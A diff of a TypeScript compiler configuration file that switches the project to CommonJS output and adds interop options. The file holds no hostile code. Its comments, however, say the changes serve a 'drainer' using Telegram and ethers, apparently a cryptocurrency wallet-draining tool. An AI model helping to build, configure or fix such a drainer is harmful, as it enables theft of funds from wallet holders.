@@ -1,21 +1,23 @@
 {
-  "compilerOptions": {
-    "target": "ES2020",
-    "useDefineForClassFields": true,
-    "lib": ["ES2020"],
-    "outDir": "./dist",
-    "module": "ESNext",
-    "skipLibCheck": true,
-    "moduleResolution": "node",  // Changed: For Node/ts-node resolution
-    "allowImportingTsExtensions": false,  // Changed: Enforce .js in code for ESM runtime
-    "resolveJsonModule": true,
-    "isolatedModules": true,
-    "noEmit": true,
-    "strict": true,
-    "noUnusedLocals": false,  // Changed: Temp disable to avoid lint crashes; re-enable later
-    "noUnusedParameters": true,
-    "noFallthroughCasesInSwitch": true
-  },
-  "include": ["src"],
-  "references": [{ "path": "./tsconfig.node.json" }]
+"compilerOptions": {
+"target": "ES2020",
+"useDefineForClassFields": true,
+"lib": ["ES2020"],
+"outDir": "./dist",
+"module": "commonjs",  // Switched: Ditch ESM for Node stability; no more loader crashes
+"skipLibCheck": true,
+"moduleResolution": "node",
+"allowImportingTsExtensions": false,
+"resolveJsonModule": true,
+"isolatedModules": true,
+"noEmit": false,  // Fixed: Set to false so tsc spits out JS to dist/
+"strict": true,
+"noUnusedLocals": false,  // Keep disabled for now
+"noUnusedParameters": true,
+"noFallthroughCasesInSwitch": true,
+"esModuleInterop": true,  // Added: Smooths commonjs/ESM imports in drainer
+"allowSyntheticDefaultImports": true  // Added: For Telegram/ethers bullshit
+},
+"include": ["src"],
+"exclude": ["node_modules", "dist"]  // Added: Skip crap
 }
